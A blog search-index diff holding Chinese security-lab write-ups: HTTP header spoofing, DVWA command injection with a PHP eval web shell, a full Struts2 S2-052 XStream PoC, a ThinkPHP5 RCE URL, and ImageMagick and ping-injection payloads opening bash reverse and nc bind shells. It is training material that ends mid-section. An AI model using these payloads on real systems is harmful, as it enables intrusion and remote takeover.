@@ -1,6 +1,62 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>实验_web安全之HTTP头部字段理解</title>
+    <url>/web/%E5%AE%9E%E9%AA%8C-web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<h1 id="web安全之HTTP头部字段理解"><a href="#web安全之HTTP头部字段理解" class="headerlink" title="web安全之HTTP头部字段理解"></a>web安全之HTTP头部字段理解</h1><h2 id="第一题-观察HTTP-响应头"><a href="#第一题-观察HTTP-响应头" class="headerlink" title="第一题 观察HTTP 响应头"></a>第一题 观察HTTP 响应头</h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>
+
+<p>得到:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二题-Referer理解"><a href="#第二题-Referer理解" class="headerlink" title="第二题 Referer理解"></a>第二题 Referer理解</h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
+<p>通过命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>
+
+<p>从响应中获取key:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三题-X-Forwarded-For理解"><a href="#第三题-X-Forwarded-For理解" class="headerlink" title="第三题 X-Forwarded-For理解"></a>第三题 X-Forwarded-For理解</h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>
+
+<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
+
+<p>得到key</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<h2 id="第四题-User-Agent理解"><a href="#第四题-User-Agent理解" class="headerlink" title="第四题 User-Agent理解"></a>第四题 User-Agent理解</h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>
+
+<p>得到key:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+
+<p>第五题 Accept-Language理解</p>
+<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="第六题-Cookie理解"><a href="#第六题-Cookie理解" class="headerlink" title="第六题 Cookie理解"></a>第六题 Cookie理解</h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+
+<p>发现响应头中会设置cookie:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>
+
+<p>所以请求时将cookie设置为Login=admin即可。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>http</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>合天培训_实验_上传文件考核</title>
     <url>/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%80%83%E6%A0%B8/</url>
     <content><![CDATA[<h2 id="1-beecms"><a href="#1-beecms" class="headerlink" title="1.beecms"></a>1.beecms</h2><p>首先后台登录</p>
@@ -63,60 +119,324 @@
 ]]></content>
   </entry>
   <entry>
-    <title>实验_web安全之HTTP头部字段理解</title>
-    <url>/web/%E5%AE%9E%E9%AA%8C-web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="web安全之HTTP头部字段理解"><a href="#web安全之HTTP头部字段理解" class="headerlink" title="web安全之HTTP头部字段理解"></a>web安全之HTTP头部字段理解</h1><h2 id="第一题-观察HTTP-响应头"><a href="#第一题-观察HTTP-响应头" class="headerlink" title="第一题 观察HTTP 响应头"></a>第一题 观察HTTP 响应头</h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>
+    <title>合天培训_实验_命令执行</title>
+    <url>/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="命令执行实验"><a href="#命令执行实验" class="headerlink" title="命令执行实验"></a>命令执行实验</h1><center>gwolfs</center>
+[toc]
 
-<p>得到:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>
+<h2 id="1-命令执行漏洞"><a href="#1-命令执行漏洞" class="headerlink" title="1. 命令执行漏洞"></a>1. 命令执行漏洞</h2><p>（1）实验介绍</p>
+<p>实验链接： <a href="http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401</a> </p>
+<p>实验来源：合天网安实验室</p>
+<p>实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 </p>
+<p>（2）实验操作</p>
+<p>1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。</p>
+<p>2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。</p>
+<p>尝试127.0.0.1</p>
+<p><img src="/assets/image-20200426123935628.png" alt="image-20200426123935628"></p>
+<p>3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。</p>
+<p>4）构造payload</p>
+<ul>
+<li><p>127.0.0.1 | net user          查看用户</p>
+<p><img src="/assets/image-20200426124613975.png" alt="image-20200426124613975"></p>
+</li>
+<li><p>127.0.0.1 | echo “<?php phpinfo; ?>“ &gt; 1.php        写php文件</p>
+</li>
+</ul>
+<p><img src="/assets/image-20200426125031831.png" alt="image-20200426125031831"></p>
+<ul>
+<li>127.0.0.1 | echo “<?php @eval($_POST['cmd']); ?>“ &gt; shell.php 写shell</li>
+</ul>
+<p>用菜刀连接</p>
+<p><img src="/assets/image-20200426125304313.png" alt="image-20200426125304313"></p>
+<p><img src="/assets/image-20200426125326981.png" alt="image-20200426125326981"></p>
+<p>由于实验机里没有nc工具就不尝试反弹shell了。</p>
+<p>5)medium难度操作</p>
+<p>通过fuzz发现&amp;&amp;和;被过滤了。</p>
+<ul>
+<li>127.0.0.1;dir</li>
+</ul>
+<p><img src="/assets/image-20200426130010047.png" alt="image-20200426130010047"></p>
+<ul>
+<li><p>127.0.0.1 &amp;&amp; dir</p>
+<p><img src="/assets/image-20200426130102921.png" alt="image-20200426130102921"></p>
+</li>
+</ul>
+<p>但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的|</p>
+<p>如果非要用&amp;&amp;可以使用下面方式：</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> &amp;;&amp; dir</span><br></pre></td></tr></table></figure>
 
-<h2 id="第二题-Referer理解"><a href="#第二题-Referer理解" class="headerlink" title="第二题 Referer理解"></a>第二题 Referer理解</h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
-<p>通过命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>
+<p>所以medium存在问题是使用黑名单，且黑名单机制不全。</p>
+<h2 id="2-CVE-2017-9805Struts2-052漏洞实验"><a href="#2-CVE-2017-9805Struts2-052漏洞实验" class="headerlink" title="2. CVE-2017-9805Struts2-052漏洞实验"></a>2. CVE-2017-9805Struts2-052漏洞实验</h2><p>（1）实验介绍</p>
+<p>实验链接：  <a href="http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2</a> </p>
+<p>实验来源：合天网安实验室</p>
+<p>实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术</p>
+<p>（2）实验操作</p>
+<p>1）搭建实验环境。</p>
+<p>tomcat开启。下载软件源代码，部署war文件。打开  <a href="http://127.0.0.1:8080/struts2-rest-showcase" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-rest-showcase</a> 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。</p>
+<p>2）正常业务</p>
+<p>点击edit，随便输入内容提交，成功提交。</p>
+<p>3）poc测试</p>
+<p><img src="/assets/image-20200426141646790.png" alt="image-20200426141646790"></p>
+<p>发现报错500，rce成功。而且弹出了计算器。</p>
+<p>4）漏洞分析</p>
+<p>XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。</p>
+<p>5）poc分析</p>
+<p>poc:</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span> <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span> <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span> <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span> <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span> <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span> <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span> <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span> <span class="tag">&lt;<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">string</span>&gt;</span>cacl<span class="tag">&lt;/<span class="name">string</span>&gt;</span> <span class="tag">&lt;/<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span> <span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">iter</span>&gt;</span> <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span> <span class="tag">&lt;<span class="name">method</span>&gt;</span> <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span> <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span> <span class="tag">&lt;/<span class="name">method</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;/<span class="name">filter</span>&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span> <span class="tag">&lt;<span class="name">lock</span>/&gt;</span> <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span> <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span> <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span> <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span> <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span> <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span> <span class="tag">&lt;/<span class="name">is</span>&gt;</span> <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span> <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span> <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span> <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span> <span class="tag">&lt;/<span class="name">value</span>&gt;</span> <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>从响应中获取key:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
 
-<h2 id="第三题-X-Forwarded-For理解"><a href="#第三题-X-Forwarded-For理解" class="headerlink" title="第三题 X-Forwarded-For理解"></a>第三题 X-Forwarded-For理解</h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
 
-<p>得到：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>
 
-<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>
 
-<p>得到key</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
+<p>poc看不懂，分析是传入xml文件，估计下面语句</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;command&gt;</span><span class="symbol">&lt;string&gt;</span>C:\Windows\System32\calc.<span class="keyword">exe</span>&lt;/<span class="built_in">string</span>&gt;&lt;/<span class="keyword">command</span>&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="第四题-User-Agent理解"><a href="#第四题-User-Agent理解" class="headerlink" title="第四题 User-Agent理解"></a>第四题 User-Agent理解</h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>
+<p>被当作命令执行。</p>
+<h2 id="3-Thinkphp5-远程命令执行漏洞"><a href="#3-Thinkphp5-远程命令执行漏洞" class="headerlink" title="3. Thinkphp5 远程命令执行漏洞"></a>3. Thinkphp5 远程命令执行漏洞</h2><p>（1）实验介绍</p>
+<p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
+<p>实验来源：合天网安实验室</p>
+<p>实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 </p>
+<p>（2）实验操作</p>
+<p>1）安装环境。</p>
+<ul>
+<li>利用<code>netstat -tunlp</code>检测是否开启AMP。注意php端口为9000。</li>
+<li>下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。</li>
+</ul>
+<p>2）实验操作</p>
+<p>直接利用实验里带的ThinkPHP5漏洞检测工具。</p>
+<p><img src="/assets/image-20200426144136346.png" alt="image-20200426144136346"></p>
+<p>发现poc。</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request\<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>
 
-<p>得到key:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>
 
-<p>第五题 Accept-Language理解</p>
-<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>
 
-<h2 id="第六题-Cookie理解"><a href="#第六题-Cookie理解" class="headerlink" title="第六题 Cookie理解"></a>第六题 Cookie理解</h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+<p>测试</p>
+<p><img src="/assets/image-20200426144439093.png" alt="image-20200426144439093"></p>
+<p>发现正确。然后getshell.</p>
+<p><img src="/assets/image-20200426144235821.png" alt="image-20200426144235821"></p>
+<p>3）漏洞分析</p>
+<p>a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自<code>$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]</code>，所以可以通过控制输入的参数s来控制pathinfo.</p>
+<p>b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。</p>
+<p>c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。</p>
+<p>问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。</p>
+<p>e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。</p>
+<p>4）poc</p>
+<p>poc不懂。。。</p>
+<h2 id="4-ImageMagick漏洞"><a href="#4-ImageMagick漏洞" class="headerlink" title="4. ImageMagick漏洞"></a>4. ImageMagick漏洞</h2><p>（1）实验介绍</p>
+<p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
+<p>实验来源：合天网安实验室</p>
+<p>实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法</p>
+<p>（2）实验操作</p>
+<p>1）检查ImageMagick版本</p>
+<p><img src="/assets/image-20200426165939722.png" alt="image-20200426165939722"></p>
+<p>版本号为6.8.9.</p>
+<p>2）漏洞测试</p>
+<p>创建exploit.png,其内容为：</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|ls "</span>-la)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
 
-<p>发现响应头中会设置cookie:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>
+<p>利用convert生成新文件：</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">convert</span> <span class="selector-tag">exploit</span><span class="selector-class">.png</span> <span class="selector-tag">out</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure>
 
-<p>所以请求时将cookie设置为Login=admin即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>
+<p>可以发现成功执行了ls -a命令。证明存在命令执行漏洞。</p>
+<p>3）漏洞利用</p>
+<p>在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。</p>
+<p><img src="/assets/image-20200426171311315.png" alt="image-20200426171311315"></p>
+<p>发现是用的ImageMagick工具转换的。</p>
+<p>先下载 nc，并在本地开启监听。</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc.exe -nvlp <span class="number">12301</span></span><br></pre></td></tr></table></figure>
 
+
+
+<p>上传一个可以弹shell的图片。图片内容：</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1"</span>)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+
+<p>上传后shell反弹成功。</p>
+<p><img src="/assets/image-20200426172341563.png" alt="image-20200426172341563"></p>
+<p>4）漏洞分析</p>
+<p>ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为：</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="string">"wget"</span> -<span class="keyword">q</span> -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></span><br></pre></td></tr></table></figure>
+
+<p>而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。</p>
+<h2 id="5-web安全之命令执行漏洞理解"><a href="#5-web安全之命令执行漏洞理解" class="headerlink" title="5.web安全之命令执行漏洞理解"></a>5.web安全之命令执行漏洞理解</h2><h3 id="A-rce-ping"><a href="#A-rce-ping" class="headerlink" title="A.rce_ping"></a>A.rce_ping</h3><p>（1）正常业务</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>
+
+<p>有回显。</p>
+<p>（2）fuzz测试。</p>
+<p>首先抓包</p>
+<p><img src="/assets/image-20200426133832110.png" alt="image-20200426133832110"></p>
+<p>发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>],<span class="variable">$return</span>);<span class="built_in">echo</span> <span class="variable">$return</span>;</span><br><span class="line"><span class="built_in">echo</span> system(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。</p>
+<p>（3）由于没有任何过滤所以直接写shell。</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ipaddress</span>=127.0.0.1 | echo <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['cmd']); ?&gt;"</span> &gt; shell.php &amp; <span class="attribute">submit</span>=ping</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426140144644.png" alt="image-20200426140144644"></p>
+<p>尝试连接：</p>
+<p><img src="/assets/image-20200426140329896.png" alt="image-20200426140329896"></p>
+<p>发现失败，估计没有写的权限。</p>
+<p>（4）尝试shell</p>
+<p>a.正向shell</p>
+<p>服务器</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7777</span> -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>本机</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426173713380.png" alt="image-20200426173713380"></p>
+<p>正向shell成功。</p>
+<p>b.反弹shell</p>
+<p>本机(自己的服务器)：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lk <span class="number">7777</span></span><br></pre></td></tr></table></figure>
+
+<p>远程服务器</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>发现反弹不成功。</p>
+<p>换台服务器尝试</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426174407176.png" alt="image-20200426174407176"></p>
+<p>反弹shell成功。</p>
+<h3 id="B-rce-ping-2"><a href="#B-rce-ping-2" class="headerlink" title="B.rce_ping_2"></a>B.rce_ping_2</h3><p>直接fuzz测试。</p>
+<p><img src="/assets/image-20200426174750306.png" alt="image-20200426174750306"></p>
+<p>发现<code>; &amp;&amp;</code>被过滤了。</p>
+<p>直接正向shell测试。</p>
+<p>服务器</p>
